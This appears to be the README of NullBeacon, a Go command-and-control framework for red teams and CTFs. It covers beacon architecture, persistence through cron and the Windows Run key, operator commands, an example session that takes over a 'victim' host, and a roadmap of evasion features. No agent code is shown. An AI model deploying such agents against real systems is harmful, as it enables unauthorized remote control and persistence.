# NullBeacon

[![Go](https://github.com/RodKast/NullBeacon/actions/workflows/go.yml/badge.svg)](https://github.com/RodKast/NullBeacon/actions/workflows/go.yml)
![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
[![License](https://img.shields.io/badge/license-GPL%20v3-blue)](LICENSE)
![Status](https://img.shields.io/badge/status-active%20development-orange)

NullBeacon is a modular, beacon-based Command & Control (C2) framework written in Go. Built from the ground up for authorized security research, CTF competitions, and home lab red team operations.

> **For authorized use only.** Never deploy against systems you do not own or have explicit written permission to test.

---

## Overview

NullBeacon follows a beacon-based architecture similar to Cobalt Strike and Sliver. Agents check in to the teamserver at randomized intervals, receive queued tasks, execute them, and return output — all over an encrypted TLS channel.

```
Operator
   │
   ▼
NullBeacon Teamserver
   │
   ├── Listener Manager
   │       ├── TLS  Listener  ◄──── Agent (encrypted beacon)
   │       └── HTTPS Listener ◄──── Agent (upcoming)
   │
   ├── Agent Registry    — UUID, hostname, username, last seen
   ├── Task Queue        — per-agent, delivered on next beacon
   └── teamserver.log    — all events logged to file
```

---

## Features

| Category | Feature |
|---|---|
| **Transport** | TLS-only communication — all traffic encrypted by default |
| **Listeners** | Dynamic start/stop/list at runtime, context-based cancellation |
| **Agents** | UUID-based registration, returning beacon detection, last seen timestamp |
| **Tasks** | Per-agent task queue, delivered on beacon, output returned automatically |
| **Generation** | Cross-compile agents for Linux/Windows, random codename filenames |
| **Persistence** | Linux cron `@reboot`, Windows registry `Run` key |
| **OPSEC** | Sleep jitter (8-12s), stripped debug symbols, TLS encryption |
| **Operator UX** | readline shell, colored output, new agent notifications, help menu |

---

## Project Structure

```
NullBeacon/
├── cmd/
│   ├── teamserver/
│   │   ├── main.go         # Entry point, banner, operator shell
│   │   ├── handlers.go     # Agent connection and task delivery
│   │   ├── listeners.go    # Listener start/stop/list
│   │   ├── agents.go       # Agent list, interact shell, remove
│   │   ├── generate.go     # Agent binary generation
│   │   ├── tls.go          # TLS certificate generation
│   │   └── help.go         # Help menu
│   └── agent/
│       ├── main.go         # Beacon loop, task execution
│       ├── persist_linux.go
│       ├── persist_windows.go
│       └── persist_other.go
├── pkg/
│   ├── agent/              # Agent struct
│   ├── listener/           # Listener struct with StartTLS
│   └── task/               # Task struct
├── .github/workflows/
│   └── go.yml              # CI pipeline
├── go.mod
└── go.sum
```

---

## Installation

**Requirements:** Go 1.21+

```bash
git clone https://github.com/RodKast/NullBeacon.git
cd NullBeacon
go mod tidy
```

---

## Quick Start

**1. Start the teamserver:**
```bash
go run ./cmd/teamserver
```

**2. Start a listener:**
```
nullbeacon> listen --lhost 0.0.0.0 --lport 8443
```

**3. Generate an agent:**
```
nullbeacon> generate --os linux --arch amd64 --lhost <your_ip> --lport 8443
```

**4. Deploy the generated binary on the target machine and execute it.**

**5. Interact with the connected agent:**
```
nullbeacon> list
nullbeacon> interact <agentID>
[agent:3f9a1b2c]> whoami
```

Monitor logs in a separate terminal:
```bash
tail -f teamserver.log
```

---

## Operator Shell Reference

### Listener Commands

| Command | Description |
|---|---|
| `listen --lhost <host> --lport <port>` | Start a TLS listener |
| `listeners` | List all active listeners |
| `stop <listenerID>` | Stop a listener |

### Agent Commands

| Command | Description |
|---|---|
| `list` | List connected agents with last seen timestamp |
| `interact <agentID>` | Enter agent shell |
| `remove <agentID>` | Remove a dead agent |
| `generate --os <os> --arch <arch> --lhost <ip> --lport <port>` | Generate an agent binary |

### Agent Shell Commands

| Command | Description |
|---|---|
| `<command>` | Queue a shell task and wait for output |
| `tasks` | List all tasks and output |
| `back` | Return to main shell |

### General

| Command | Description |
|---|---|
| `help` | Show help menu |
| `exit` | Exit NullBeacon |

---

## Example Session

```
nullbeacon> listen --lhost 0.0.0.0 --lport 8443
[+] started listener a1b2c3d4 on 0.0.0.0:8443

nullbeacon> generate --os linux --arch amd64 --lhost 10.0.0.1 --lport 8443
[*] generating linux/amd64 agent...
[+] agent saved: /home/operator/GHOST_COBRA.elf (ID: 3f9a1b2c)

nullbeacon> [+] new agent connected: victim@target-pc (3f9a1b2c)

nullbeacon> list
ID: 3f9a1b2c  victim@target-pc  10.0.0.5:51234  Last Seen: 2026-06-22 10:14:02

nullbeacon> interact 3f9a1b2c
[agent:3f9a1b2c]> whoami
[*] task queued — waiting for output...
output: victim

[agent:3f9a1b2c]> tasks
[3f9a1b2c] whoami → completed: victim

[agent:3f9a1b2c]> back

nullbeacon> stop a1b2c3d4
[+] stopped listener a1b2c3d4

nullbeacon> exit
```

---

## Roadmap

### Completed
- [x] Stage 1 — TCP teamserver skeleton
- [x] Stage 2 — Agent check-in with system info
- [x] Stage 3 — Beacon loop
- [x] Stage 4 — Agent registration with UUID and mutex-protected map
- [x] Stage 5 — Operator shell
- [x] Stage 6 — Persistent agent ID + task delivery on beacon
- [x] Stage 7 — Command execution and output return
- [x] Stage 7.5 — NullBeacon CLI (readline, colors, banner)
- [x] Stage 7.6 — Dynamic listener management
- [x] Stage 7.7 — Agent generation with cross-compilation
- [x] Stage 7.8 — Teamserver refactor into focused files
- [x] Stage 7.9 — Agent reliability (retry loop, no fatal crashes)
- [x] Stage 7.10 — Operator UX (notifications, timestamps, remove)
- [x] Stage 7.11 — Basic OPSEC (strip symbols, sleep jitter)
- [x] Stage 7.12 — TLS-only transport
- [x] Stage 8 — Persistence (Linux cron, Windows registry)

### In Progress
- [ ] Stage 9 — Evasion (AMSI/ETW stubs, sleep obfuscation)

### Planned
- [ ] Stage 10 — Packing (AES payload encryption, custom loaders)
- [ ] Stage 11 — Transport hardening (HTTPS listener, malleable profiles)

### Release v0.1.0
- [ ] Stage R1 — Install script (`curl | bash`, installs to `/usr/local/bin`)
- [ ] Stage R2 — GitHub Actions release workflow (auto-build on version tag)
- [ ] Stage R3 — Uninstall command (`nullbeacon --uninstall`)
- [ ] Stage R4 — GitHub Release with pre-compiled Linux binary

### Stealth Roadmap
- [ ] Stage 12 — Process injection
- [ ] Stage 13 — Living off the Land (LOLBins)
- [ ] Stage 14 — Malleable C2 profiles
- [ ] Stage 15 — Syscall obfuscation
- [ ] Stage 16 — In-memory execution

---

## Contributing

Contributions and feedback are welcome. Open an issue or pull request on GitHub.

---

## License

GPL v3 — see [LICENSE](LICENSE) for details.

---

## Disclaimer

NullBeacon is developed for **educational purposes**, **CTF competitions**, and **authorized security research** only. The authors assume no liability for misuse. Always obtain explicit written permission before testing against any system you do not own.
